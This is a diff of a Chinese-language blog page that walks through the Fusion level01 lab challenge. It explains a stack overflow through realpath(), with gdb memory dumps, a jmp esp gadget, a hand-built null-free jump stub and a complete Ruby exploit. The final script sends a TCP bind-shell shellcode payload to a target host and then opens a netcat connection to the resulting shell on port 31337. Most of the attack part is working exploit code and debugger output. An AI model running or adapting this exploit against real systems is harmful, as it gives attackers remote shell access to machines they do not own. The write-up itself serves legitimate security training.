+</span></span><span class="line"><span class="cl">0xbf82b270: 2.<span class="o">[</span>0x7777772f<span class="o">]</span>   0x77777777    0x77777777    0x77777777
+</span></span><span class="line"><span class="cl">0xbf82b280:    0x77777777    0x77777777    0x77777777    0x77777777
+</span></span><span class="line"><span class="cl">0xbf82b290:    0x77777777    0x77777777    0x77777777    0x77777777
+</span></span><span class="line"><span class="cl">0xbf82b2a0:    0x77777777    0x77777777    0x77777777    0x77777777
+</span></span><span class="line"><span class="cl">0xbf82b2b0:    0x77777777    0x77777777    0x77777777    0x77777777
+</span></span><span class="line"><span class="cl">0xbf82b2c0:    0x77777777    0x77777777    0x77777777    0x77777777
+</span></span><span class="line"><span class="cl">0xbf82b2d0:    0x77777777    0x77777777    0x77777777    0x77777777
+</span></span><span class="line"><span class="cl">0xbf82b2e0:    0x77777777    0x77777777    0x77777777    0x77777777
+</span></span><span class="line"><span class="cl">0xbf82b2f0:    0x77777777    0x77777777    0x77777777 3.<span class="o">[</span>0x44434241<span class="o">]</span>
+</span></span><span class="line"><span class="cl">0xbf82b300:    0xbf82b300    0x00000020    0x00000004    0x001761e4
+</span></span><span class="line"><span class="cl">0xbf82b310:    0x001761e4    0x000027d8 4.<span class="o">[</span>0x20544547<span class="o">]</span>   0x7777772f
+</span></span><span class="line"><span class="cl">0xbf82b320:    0x77777777    0x77777777    0x77777777    0x77777777
+</span></span><span class="line"><span class="cl">0xbf82b330:    0x77777777    0x77777777    0x77777777    0x77777777
+</span></span><span class="line"><span class="cl">0xbf82b340:    0x77777777    0x77777777    0x77777777    0x77777777
+</span></span></code></pre></div><p>从现在开始，esp 保存的地址是 3:<code>0xbf82b2fc: [0x44434241]</code>，而接下来 <em>ret</em> 相当于 <em>pop eip</em> 所做的就是把这里的值 <em>0x44434241</em> 写入 eip 中</p>
+<hr>
+<p>虽然我们没法确定 esp 的具体地址，</p>
+<p>但是我们可以知道 esp 这一刻保存的地址到 2:<code>0xbf82b270: [0x7777772f]</code> 也就是 resolved 的偏移量，</p>
+<p><em>0xbf82b2fc - 0xbf82b270 = 0x8c = 140 in dec</em></p>
+<p>由于这段程序并没有开 Position Independent Executable，所以 .text 段的地址是不会改变的，</p>
+<p>那么，我们是否可以把 return pointer 指向 .text 中的某个操作，比如：<em>jmp esp</em>？</p>
+<h2 id="return-oriented-programming">Return Oriented Programming</h2>
+<p>msfelfscan 是<a class="link" href="http://www.metasploit.com"  target="_blank" rel="noopener"
+    >Metasploit</a> 工具集中用来扫描 elf 的一个工具</p>
+<p>用它来找 <em>jmp esp</em> 的结果是：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; /opt/metasploit-framework/bin/msfelfscan -j esp ./level01
+</span></span><span class="line"><span class="cl"><span class="o">[</span>./level01<span class="o">]</span>
+</span></span><span class="line"><span class="cl">0x08049f4f jmp esp
+</span></span></code></pre></div><p>先把断点设在 ret 之前吧：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Breakpoint 1, 0x08049854 in fix_path <span class="o">(</span><span class="nv">path</span><span class="o">=</span>Cannot access memory at address 0x7777777f
+</span></span><span class="line"><span class="cl"><span class="o">)</span> at level01/level01.c:9
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> x/i <span class="nv">$eip</span>
+</span></span><span class="line"><span class="cl"><span class="o">=</span>&gt; 0x8049854 &lt;fix_path+63&gt;:	ret    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> x <span class="nv">$ebp</span>
+</span></span><span class="line"><span class="cl">0x77777777:	Cannot access memory at address 0x77777777
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> x/wx <span class="nv">$esp</span>
+</span></span><span class="line"><span class="cl">0xbf82b2fc:	0x08049f4f
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> x/i 0x08049f4f
+</span></span><span class="line"><span class="cl">0x8049f4f:	jmp    *%esp
+</span></span></code></pre></div><p>可以看到，之前我们已经把 esp 写上了 <code>0x08048c77</code>，也就是一个 <em>jmp esp</em> 在 .text 段里的地址</p>
+<p>接下来，前进一步，即执行 ret：<em>pop eip</em>，就会把 esp 存的值写给 eip，</p>
+<p>也就是跳到 .text 段中另一个我们想使用的 <em>jmp esp</em>：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> si
+</span></span><span class="line"><span class="cl">Cannot access memory at address 0x7777777b
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> x/i <span class="nv">$eip</span>
+</span></span><span class="line"><span class="cl"><span class="o">=</span>&gt; 0x8049f4f:	jmp    *%esp
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> x/wx <span class="nv">$esp</span>
+</span></span><span class="line"><span class="cl">0xbf82b300:	0xbf82b300
+</span></span></code></pre></div><p>这时候前进一步，执行这句 <em>jmp esp</em>，就能把 eip 指向栈：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> si
+</span></span><span class="line"><span class="cl">0xbf82b300 in ?? <span class="o">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> x/5i <span class="nv">$eip</span>
+</span></span><span class="line"><span class="cl"><span class="o">=</span>&gt; 0xbf82b300:	add    %dh,0x20bf82<span class="o">(</span>%ebx<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   0xbf82b306:	add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   0xbf82b308:	add    <span class="nv">$0</span>x0,%al
+</span></span><span class="line"><span class="cl">   0xbf82b30a:	add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   0xbf82b30c:	in     <span class="nv">$0</span>x61,%al
+</span></span></code></pre></div><p>成功了！现在 eip 指向了 <em>0xbf82b300</em>，也就是栈</p>
+<p>虽然现在看起来只是一堆完全不知道在干什么的指令&hellip;</p>
+<p>但最后只要在这里放上 shellcode 就可以解决了么</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> x/60x 0xbf82b260
+</span></span><span class="line"><span class="cl">0xbf82b260:    0xbf82b31c    0xbf82b270    0x080484fc    0x00000200
+</span></span><span class="line"><span class="cl">0xbf82b270: 2.<span class="o">[</span>0x7777772f<span class="o">]</span>   0x77777777    0x77777777    0x77777777
+</span></span><span class="line"><span class="cl">0xbf82b280:    0x77777777    0x77777777    0x77777777    0x77777777
+</span></span><span class="line"><span class="cl">0xbf82b290:    0x77777777    0x77777777    0x77777777    0x77777777
+</span></span><span class="line"><span class="cl">0xbf82b2a0:    0x77777777    0x77777777    0x77777777    0x77777777
+</span></span><span class="line"><span class="cl">0xbf82b2b0:    0x77777777    0x77777777    0x77777777    0x77777777
+</span></span><span class="line"><span class="cl">0xbf82b2c0:    0x77777777    0x77777777    0x77777777    0x77777777
+</span></span><span class="line"><span class="cl">0xbf82b2d0:    0x77777777    0x77777777    0x77777777    0x77777777
+</span></span><span class="line"><span class="cl">0xbf82b2e0:    0x77777777    0x77777777    0x77777777    0x77777777
+</span></span><span class="line"><span class="cl">0xbf82b2f0:    0x77777777    0x77777777    0x77777777 3.<span class="o">[</span>0x08048c77<span class="o">]</span>
+</span></span><span class="line"><span class="cl">0xbf82b300: 4.<span class="o">[</span>0xbf82b300<span class="o">]</span>   0x00000020    0x00000004    0x001761e4
+</span></span><span class="line"><span class="cl">0xbf82b310:    0x001761e4    0x000027d8 1.<span class="o">[</span>0x20544547<span class="o">]</span>   0x7777772f
+</span></span><span class="line"><span class="cl">0xbf82b320:    0x77777777    0x77777777    0x77777777    0x77777777
+</span></span><span class="line"><span class="cl">0xbf82b330:    0x77777777    0x77777777    0x77777777    0x77777777
+</span></span><span class="line"><span class="cl">0xbf82b340:    0x77777777    0x77777777    0x77777777    0x77777777
+</span></span></code></pre></div><p>总结下，目前程序执行的步骤是：</p>
+<p>1.<code>0xbf82b318: [0x20544547]</code>，从这里开始写 buffer（<em>0x20544547</em> = &ldquo;GET &ldquo;）</p>
+<p>2.<code>0xbf82b270: [0x7777772f]</code>，这里是 realpath 解析完后的 resolved</p>
+<p>3.<code>0xbf82b2fc: [0x08048c77]</code>，由于 resolved 太长，于是这里的 return pointer 被覆盖，写上了 .text 一个 <em>jmp esp</em> 的地址</p>
+<p>4.<code>0xbf82b300: [0xbf82b300]</code>，那个 jmp 成功帮我们把 eip 跳到了这里</p>
+<h2 id="calculate-offset">Calculate Offset</h2>
+<p>所以 shellcode 从哪里开始呢&hellip;</p>
+<p>因为 <code>realpath()</code> 只会解析第一个「/」，舍弃第二个「/」后面的内容，而我们又必须通过 <code>realpath()</code> 来覆盖，</p>
+<p>而我们无法确定 shellcode 会不会包含「/」&hellip;我觉得肯定有（比如「/bin/sh」这样的字符串），这样的话&hellip;</p>
+<p>那么，我们是否可以构造更小的一段不含「/」的 shellcode，让它再跳到真正的 shellcode 呢</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">request</span> <span class="o">=</span> <span class="s2">&#34;GET &#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">protocol</span> <span class="o">=</span> <span class="s2">&#34; HTTP/1.1 &#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">padding</span> <span class="o">=</span> <span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="s2">&#34;w&#34;</span> <span class="o">*</span> <span class="mi">139</span>
+</span></span><span class="line"><span class="cl"><span class="n">return_addr</span> <span class="o">=</span> <span class="o">[</span><span class="mh">0x08049f4f</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;I&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">to_s</span><span class="o">.</span><span class="n">force_encoding</span><span class="p">(</span><span class="s2">&#34;UTF-8&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">nop</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">100</span>
+</span></span><span class="line"><span class="cl"><span class="n">jmp_real_shellcode</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\xCC\xCC\xCC\xCC</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">10</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="o">[</span><span class="mh">0xdeadbeaf</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;I&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">to_s</span> <span class="o">*</span> <span class="mi">10</span><span class="p">)</span><span class="o">.</span><span class="n">force_encoding</span><span class="p">(</span><span class="s2">&#34;UTF-8&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">request</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">return_addr</span> <span class="o">+</span>  <span class="n">nop</span> <span class="o">+</span> <span class="n">jmp_real_shellcode</span> <span class="o">+</span> <span class="n">protocol</span> <span class="o">+</span> <span class="n">shellcode</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="s2">&#34;press any key to continue&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">gets</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="s2">&#34;&gt; payload: &#34;</span> <span class="o">+</span> <span class="n">payload</span><span class="o">.</span><span class="n">inspect</span>
+</span></span><span class="line"><span class="cl"><span class="n">socket</span><span class="o">.</span><span class="n">puts</span> <span class="n">payload</span>
+</span></span></code></pre></div><p>以及，我们并不知道 shellcode 真正的地址，所以这次我们也通过 esp 来计算偏移：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> c
+</span></span><span class="line"><span class="cl">Continuing.
+</span></span><span class="line"><span class="cl">Program received signal SIGTRAP, Trace/breakpoint trap.
+</span></span><span class="line"><span class="cl">0xbf82b365 in ?? <span class="o">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> x/wx <span class="nv">$esp</span> 
+</span></span><span class="line"><span class="cl">0xbf82b300:	0x90909090
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> x/140x 0xbf82b260
+</span></span><span class="line"><span class="cl">0xbf82b260:    0xbf82b31c    0xbf82b270    0x080484fc    0x00000200
+</span></span><span class="line"><span class="cl">0xbf82b270: 2.<span class="o">[</span>0x7777772f<span class="o">]</span>   0x77777777    0x77777777    0x77777777
+</span></span><span class="line"><span class="cl"><span class="c1">#                        &lt;-- 0x77777777 --&gt;</span>
+</span></span><span class="line"><span class="cl">0xbf82b2f0:    0x77777777    0x77777777    0x77777777    0x08049f4f
+</span></span><span class="line"><span class="cl">0xbf82b300: 3.<span class="o">[</span>0xcccccccc<span class="o">]</span>←  0xcccccccc    0xcccccccc    0xcccccccc
+</span></span><span class="line"><span class="cl">0xbf82b310:    0xcccccccc    0xcccccccc 1.<span class="o">[</span>0xcccccccc<span class="o">]</span>   0xcccccccc
+</span></span><span class="line"><span class="cl">0xbf82b320:    0xcccccccc    0xcccccccc    0x77777700    0x77777777
+</span></span><span class="line"><span class="cl"><span class="c1">#                        &lt;-- 0x77777777 --&gt;</span>
+</span></span><span class="line"><span class="cl">0xbf82b390:    0x77777777    0x77777777    0x77777777    0x77777777
+</span></span><span class="line"><span class="cl">0xbf82b3a0:    0x77777777    0x77777777    0x08049f4f    0xcccccccc
+</span></span><span class="line"><span class="cl">0xbf82b3b0:    0xcccccccc    0xcccccccc    0xcccccccc    0xcccccccc
+</span></span><span class="line"><span class="cl"><span class="c1">#                        &lt;-- 0xcccccccc --&gt;</span>
+</span></span><span class="line"><span class="cl">0xbf82b3d0:    0xcccccccc ß.<span class="o">[</span>0x54544800    0x2e312f50    0x90909031<span class="o">]</span>
+</span></span><span class="line"><span class="cl">0xbf82b3e0: 4.<span class="o">[</span>0x90909090<span class="o">]</span>   0x90909090    0x90909090    0x90909090
+</span></span><span class="line"><span class="cl">0xbf82b3f0:    0x90909090    0x90909090    0x90909090
+</span></span><span class="line"><span class="cl"><span class="c1">#                        &lt;-- 0x90909090 --&gt;</span>
+</span></span><span class="line"><span class="cl">0xbf82b430:    0x90909090    0x90909090    0x90909090    0x90909090
+</span></span><span class="line"><span class="cl">0xbf82b440: 5.<span class="o">[</span>0xdeadbeaf<span class="o">]</span>   0xdeadbeaf    0xdeadbeaf    0xdeadbeaf
+</span></span><span class="line"><span class="cl">0xbf82b450:    0xdeadbeaf    0xdeadbeaf    0xdeadbeaf    0xdeadbeaf
+</span></span><span class="line"><span class="cl">......
+</span></span></code></pre></div><p>最后在总结一下我们做了什么：</p>
+<p>1.<code>0xbf82b318: [0x20544547]</code>，从这里开始写 buffer（<em>0x20544547</em> = &ldquo;GET &ldquo;）</p>
+<p>2.<code>0xbf82b270: [0x7777772f]</code>，这里是 realpath 解析完 buffer 存进了的 resolved</p>
+<p>3.<code>0xbf82b2fc: [0x08048c77]</code>，由于 resolved 太长，于是这里的 return pointer 被覆盖，写上了 .text 一个 <em>jmp esp</em> 的地址</p>
+<p>4.<code>0xbf82b300: [0xcccccccc]</code>，.text 段中的 <em>jmp esp</em> 成功帮我们把 eip 跳到了这里，而这里写着跳到「真・shellcode」的「伪・shellcode」</p>
+<p>5.<code>0xbf82b440: [0xdeadbeaf]</code>，真正的 shellcode，由于写在 ß.<code>0xbf82b3d4:[&quot; HTTP/1.1 &quot;]</code> 后面，所以这里的 shellcode 可以包含任意字符</p>
+<p>最后计算一下这一刻的 esp 到「真・shellcode」之前的 NOP 的偏移量&hellip;</p>
+<p><em>0xbf82b3e0 - 0xbf82b300 = 0xe0</em></p>
+<p>做成 shellcode，使用<a class="link" href="http://shell-storm.org/online/Online-Assembler-and-Disassembler"  target="_blank" rel="noopener"
+    >这个工具</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># x86(32)</span>
+</span></span><span class="line"><span class="cl">add esp, 0xe0
+</span></span><span class="line"><span class="cl">jmp esp
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Assembly - Little Endian</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x81\xc4\xe0\x00\x00\x00\xff\xe4&#34;</span>
+</span></span></code></pre></div><p>麻袋，有个问题，这里出现了「\x00」</p>
+<p>字符串是以 nullbyte 认定结尾的，这样的话绝对会被提前截断</p>
+<p>于是想出了一个一点也不优美但是至少能达到目的的做法：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># x86(32)</span>
+</span></span><span class="line"><span class="cl">add esp, 0x10101010
+</span></span><span class="line"><span class="cl">sub esp, 0x10100F30
+</span></span><span class="line"><span class="cl">jmp esp
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Assembly - Little Endian</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;\x81\xc4\x10\x10\x10\x10\x81\xec\x30\x0f\x10\x10\xff\xe4&#34;</span>
+</span></span></code></pre></div><hr>
+<h2 id="end">End</h2>
+<p>结束&hellip;.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/ruby</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -*- coding: UTF-8 -*-</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="s2">&#34;&gt; Enter hostname:&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">hostname</span> <span class="o">=</span> <span class="nb">gets</span><span class="o">.</span><span class="n">chomp</span>
+</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">20001</span>
+</span></span><span class="line"><span class="cl"><span class="n">socket</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">request</span> <span class="o">=</span> <span class="s2">&#34;GET &#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">protocol</span> <span class="o">=</span> <span class="s2">&#34; HTTP/1.1&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">padding</span> <span class="o">=</span> <span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="s2">&#34;w&#34;</span> <span class="o">*</span> <span class="mi">139</span>
+</span></span><span class="line"><span class="cl"><span class="n">return_addr</span> <span class="o">=</span> <span class="o">[</span><span class="mh">0x08049f4f</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;I&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">to_s</span><span class="o">.</span><span class="n">force_encoding</span><span class="p">(</span><span class="s2">&#34;UTF-8&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">nop</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">99</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#jmp_real_shellcode = &#34;\xCC\xCC\xCC\xCC&#34; * 10</span>
+</span></span><span class="line"><span class="cl"><span class="n">jmp_real_shellcode</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x90\x90</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\x81\xc4\x10\x10\x10\x10\x81\xec\x30\x0f\x10\x10\xff\xe4</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\xCC</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">40</span> <span class="o">-</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># tcpbindshell  (108 bytes)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># http://shell-storm.org/shellcode/files/shellcode-847.php</span>
+</span></span><span class="line"><span class="cl"><span class="no">PORTHL</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x7a\x69</span><span class="s2">&#34;</span> <span class="c1"># default is \x7a\x69 = 31337</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x52\x66\x68</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="no">PORTHL</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2\xb0\x0b\xcd\x80</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">request</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">return_addr</span> <span class="o">+</span> <span class="n">jmp_real_shellcode</span> <span class="o">+</span> <span class="n">protocol</span> <span class="o">+</span>  <span class="n">nop</span> <span class="o">+</span> <span class="n">shellcode</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="s2">&#34;&gt; payload: &#34;</span> <span class="o">+</span> <span class="n">payload</span><span class="o">.</span><span class="n">inspect</span>
+</span></span><span class="line"><span class="cl"><span class="n">socket</span><span class="o">.</span><span class="n">puts</span> <span class="n">payload</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">command</span> <span class="o">=</span> <span class="s2">&#34;nc -v </span><span class="si">#{</span><span class="n">hostname</span><span class="si">}</span><span class="s2"> 31337&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="s2">&#34;&gt; when you want to exit the shell, use `Ctrl+C` instead of `exit`&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="s2">&#34;&gt; </span><span class="si">#{</span><span class="n">command</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">system</span> <span class="n">command</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">socket</span><span class="o">.</span><span class="n">close</span>
+</span></span></code></pre></div><p><img src="/p/fusion_level_01/host.png"
+	width="2878"
+	height="1308"
+	srcset="/p/fusion_level_01/host_hubc4b35373027b1e3b03da90da0035f48_1454588_480x0_resize_box_3.png 480w, /p/fusion_level_01/host_hubc4b35373027b1e3b03da90da0035f48_1454588_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="host.png"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="220"
+		data-flex-basis="528px"
+	
+></p>
+<p><img src="/p/fusion_level_01/virtual.png"
+	width="2878"
+	height="1100"
+	srcset="/p/fusion_level_01/virtual_hu3fa5dd3ba2c818abfe88d779311f5bc8_1291915_480x0_resize_box_3.png 480w, /p/fusion_level_01/virtual_hu3fa5dd3ba2c818abfe88d779311f5bc8_1291915_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="virtual.png"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="261"
+		data-flex-basis="627px"
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
     
 
-    <div class="article-title-wrapper">
-        <h2 class="article-title">
-            <a href="/p/senntaku/">1986.10.5・六軒島</a>
-        </h2>
-    
-        
-        <h3 class="article-subtitle">
-              
-        </h3>
-        
-    </div>
-
-    
-    <footer class="article-time">
-        
-            <div>
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z"/>
-  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
-  <circle cx="18" cy="18" r="4" />
-  <path d="M15 3v4" />
-  <path d="M7 3v4" />
-  <path d="M3 11h16" />
-  <path d="M18 16.496v1.504l1 1" />
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
 </svg>
-                <time class="article-time--published">Oct 05, 1986</time>
+
+
+
+        <span>
+            最后更新于 Apr 27, 2022 14:58 UTC
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+
+
+
+<script src="//cdn.jsdelivr.net/npm/@waline/client/dist/Waline.min.js"></script>
+<div id="waline"></div>
+<script>
+    var locale = {
+        nick: '昵称',
+        nickError: '昵称的字符太少了...',
+        mail: '邮箱',
+        mailError: '邮件地址似乎不太对...',
+        link: '网址',
+        placeholder: '随意写点什么吧ww',
+        sofa: '这里还空空的...',
+        submit: 'Send!',
+        reply: '回复',
+        cancelReply: '取消回复',
+        comment: '留言',
+        more: '加载更多...',
+        preview: '预览',
+        emoji: '表情',
+        expand: '查看更多...',
+        seconds: '秒前',
+        minutes: '分钟前',
+        hours: '小时前',
+        days: '天前',
+        now: '刚刚',
+        uploading: '正在上传',
+        login: '登录',
+        logout: '退出',
+        admin: 'Admin',
+        word: '字',
+        wordHint: '评论字数应在 $0 到 $1 字之间...\n然而当前只有 $2 字x',
+    };
+
+    Waline({
+        el: '#waline',
+        serverURL: 'https://senri-blog-waline-nrt8pfbqd-kurususenri.vercel.app',
+        avatar: 'identicon',
+        login: 'enabled',
+        meta: ['nick', 'mail', 'link'],
+        placeholder: '随意写点什么吧ww',
+        locale
+    });
+</script>
+<style>
+    :root {
+         
+        --waline-font-size: 16px;
+
+         
+        --waline-white: rgb(255, 255, 255);
+        --waline-light-grey: #999;
+        --waline-dark-grey: #666;
+
+         
+        --waline-theme-color: #f7839a;
+        --waline-active-color: #55CDFC;
+
+         
+        --waline-text-color: #444;
+        --waline-bgcolor: #f7f5f1;
+        --waline-bgcolor-light: #f8f8f8;
+        --waline-border-color: #ddd;
+        --waline-disable-bgcolor: #f8f8f8;
+        --waline-disable-color: #ddd;
+
+         
+        --waline-bq-color: #f0f0f0;
+
+         
+        --waline-avatar-size: 3.25rem;
+
+         
+        --waline-badge-color: #f7839a;
+        --waline-badge-font-size: 0.775em;
+
+         
+        --waline-info-bgcolor: #f8f8f8;
+        --waline-info-color: rgb(68, 68, 68);
+        --waline-info-font-size: 0.625em;
+
+
+         
+        --waline-border: 1px solid var(--waline-border-color);
+        --waline-box-shadow: none;
+    }
+</style>
+
+    
+
+    
+
+<aside class="related-contents--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-contents">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/protostar_stack_4-7/">
+        
+        
+            <div class="article-image">
+                <img src="/p/protostar_stack_4-7/cover.cfd920525b2d933021345b98658bc9b7_hu89b69cad7273891b1af867ec9c4a2eb7_439381_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Protostar Stack 0-7 Walkthrough"
+                        data-key="protostar_stack_4-7" 
+                        data-hash="md5-z9kgUlstkzAhNFuYZYvJtw==">
+                
             </div>
         
 
-        
-    </footer>
-    
-
-    
-</div>
-</header>
+        <div class="article-details">
+            <h2 class="article-title">Protostar Stack 0-7 Walkthrough</h2>
+        </div>
+    </a>
 </article>
+            
+                
+<article class="has-image">
+    <a href="/p/old_dlmalloc_unlink_tricks/">
         
-    </section>
-    <nav class='pagination'>
         
+            <div class="article-image">
